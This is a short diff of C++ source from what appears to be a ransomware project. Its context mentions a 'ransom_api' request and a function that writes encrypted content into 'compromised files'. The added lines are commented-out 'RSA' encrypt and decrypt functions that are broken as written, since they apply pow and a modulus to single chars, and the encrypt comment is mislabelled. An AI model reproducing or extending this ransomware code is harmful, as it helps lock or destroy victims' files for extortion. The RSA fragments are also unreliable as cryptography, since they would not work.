@@ -31,6 +31,13 @@ void basicEncryptContent(std::string& content, int secretKey){
 	}
 }
 
+/*// RSA function to read all chars and increment them by one. 
+void RSAbasicEncryptContent(std::string& content, int N, int e){
+    for(char& chr : content){
+        chr = pow(chr, e) % N;
+    }
+}*/
+
 
 // Basic function to read all chars and decrement them by one.
 void basicDecryptContent(std::string& content, int secretKey){
@@ -38,6 +45,13 @@ void basicDecryptContent(std::string& content, int secretKey){
 		chr = chr - secretKey;
 	}
 }
+
+/*// Basic function to read all chars and decrement them by one.
+void RSAbasicDecryptContent(std::string& content, int N, int d){
+    for(char& chr : content){
+        chr = pow(chr, d) % N;
+    }
+}*/
 
 
 // Get request to ransom_api.
@@ -148,7 +162,7 @@ std::vector<std::vector<std::string>> fileContentRetreiver(std::vector<std::stri
     return tempVectorofStringVectors;
 }
 
-//
+// Function to inject the encrypted or decrypted content into the compromised files.
 void encryptOrDecryptFile(std::vector<std::vector<std::string>>& fileContentVector, std::vector<std::string>& fileLocationsVector){
     std::ofstream myFile;
     for(int i = 0; i < fileContentVector.size(); i++){ 
